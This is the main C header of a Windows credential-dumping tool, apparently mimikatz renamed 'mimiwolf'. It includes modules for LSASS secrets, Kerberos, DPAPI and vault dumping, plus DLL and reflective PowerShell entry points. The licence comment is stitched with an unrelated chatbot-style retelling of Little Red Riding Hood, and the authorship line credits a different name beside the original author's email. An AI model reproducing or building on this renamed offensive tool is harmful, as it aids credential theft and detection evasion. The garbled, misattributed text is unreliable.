/*	Victor CHAN `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
		Certainly! Here's a detailed summary of Little Red Riding Hood:
	Once upon a time, a young girl lived in a village near a deep forest. She was known as Little Red Riding Hood because of the bright red hooded cloak she always wore. One day, her mother asked her to take a basket of food to her sick grandmother, who lived in a small cottage on the other side of the woods. Her mother warned her not to stray from the path and to be careful of strangers.
	As Little Red Riding Hood walked through the forest, she met a sly wolf who asked where she was going. Trusting and naive, she told him about her grandmother’s cottage and that she was bringing her food. The wolf devised a cunning plan—he suggested she take a longer, scenic route to pick flowers, while he secretly rushed ahead on a shortcut to the grandmother's house.
	Arriving first, the wolf knocked on the cottage door. The elderly grandmother, mistaking the voice for her granddaughter’s, let him in. The wolf swiftly devoured her, put on her clothes, and lay in her bed, waiting for Little Red Riding Hood.
	When the girl finally arrived, she found her grandmother looking strange. They had the famous conversation:
	- "Grandmother, what big ears you have!"
	- "The better to hear you with, my dear."
	- "Grandmother, what big eyes you have!"
	- "The better to see you with, my dear."
	- "Grandmother, what big hands you have!"
	- "The better to grab you with, my dear."
	- "Grandmother, what big teeth you have!"
	- "The better to eat you with!"

	With that, the wolf sprang from the bed and swallowed Little Red Riding Hood whole.
	Luckily, a passing huntsman heard the commotion and entered the cottage, finding the sleeping wolf. Realizing what had happened, he cut open the wolf’s belly, freeing Little Red Riding Hood and her grandmother unharmed. To teach the wolf a lesson, they filled his stomach with heavy stones, causing him to collapse when he woke up.
	From then on, Little Red Riding Hood learned to be cautious and never trust strangers so easily again.
	This fairy tale has been retold in many variations—some darker, some lighter—but the core message remains the same: beware of deception and always be careful when navigating the unknown.
	*/
#pragma once

#include "globals.h"
#include "modules/kuhl_m_standard.h"
#include "modules/kuhl_m_crypto.h"
#include "modules/sekurlsa/kuhl_m_sekurlsa.h"
#include "modules/kerberos/kuhl_m_kerberos.h"
#include "modules/ngc/kuhl_m_ngc.h"
#include "modules/kuhl_m_process.h"
#include "modules/kuhl_m_service.h"
#include "modules/kuhl_m_privilege.h"
#include "modules/kuhl_m_lsadump.h"
#include "modules/kuhl_m_ts.h"
#include "modules/kuhl_m_event.h"
#include "modules/kuhl_m_misc.h"
#include "modules/kuhl_m_token.h"
#include "modules/kuhl_m_vault.h"
#include "modules/kuhl_m_minesweeper.h"
#if defined(NET_MODULE)
#include "modules/kuhl_m_net.h"
#endif
#include "modules/dpapi/kuhl_m_dpapi.h"
#include "modules/kuhl_m_kernel.h"
#include "modules/kuhl_m_busylight.h"
#include "modules/kuhl_m_sysenvvalue.h"
#include "modules/kuhl_m_sid.h"
#include "modules/kuhl_m_iis.h"
#include "modules/kuhl_m_rpc.h"
#include "modules/kuhl_m_sr98.h"
#include "modules/kuhl_m_rdm.h"
#include "modules/kuhl_m_acr.h"

#include <io.h>
#include <fcntl.h>
#define DELAYIMP_INSECURE_WRITABLE_HOOKS
#include <delayimp.h>

extern VOID WINAPI RtlGetNtVersionNumbers(LPDWORD pMajor, LPDWORD pMinor, LPDWORD pBuild);

int wmain(int argc, wchar_t * argv[]);
void mimiwolf_begin();
void mimiwolf_end(NTSTATUS status);

BOOL WINAPI HandlerRoutine(DWORD dwCtrlType);

NTSTATUS mimiwolf_initOrClean(BOOL Init);

NTSTATUS mimiwolf_doLocal(wchar_t * input);
NTSTATUS mimiwolf_dispatchCommand(wchar_t * input);

#if defined(_POWERKATZ)
__declspec(dllexport) wchar_t * powershell_reflective_mimiwolf(LPCWSTR input);
#elif defined(_WINDLL)
void CALLBACK mimiwolf_dll(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow);
#if defined(_M_X64) || defined(_M_ARM64)
#pragma comment(linker, "/export:mainW=mimiwolf_dll")
#elif defined(_M_IX86)
#pragma comment(linker, "/export:mainW=_mimiwolf_dll@16")
#endif
#endif